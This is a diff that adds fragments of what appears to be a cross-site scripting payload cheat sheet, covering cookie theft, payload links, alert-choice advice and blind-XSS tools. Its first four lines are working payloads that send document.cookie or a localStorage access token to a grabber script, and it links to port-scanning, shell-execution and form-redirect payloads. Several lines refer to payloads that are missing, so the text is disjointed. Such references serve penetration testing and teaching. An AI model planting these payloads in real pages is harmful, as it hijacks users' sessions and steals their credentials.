@@ -1,0 +1,23 @@
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
+<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
+Another way to collect sensitive data is to set a javascript keylogger.
+- [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
+- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
+- [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
+- [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
+- [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)
+This payload opens the debugger in the developer console rather than triggering a popup alert box.
+> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.
+For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.
+Better payload replacing `<script>alert(1)</script>`:
+While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developer console (doesn't require any interaction).
+- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
+- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)
+**NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
+Simple script. Codename: green triangle
+More comprehensive payload with svg tag attribute, desc script, foreignObject script, foreignObject iframe, title script, animatetransform event and simple script. Codename: red ligthning. Author: noraj.
+> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
+- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting.
+- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.
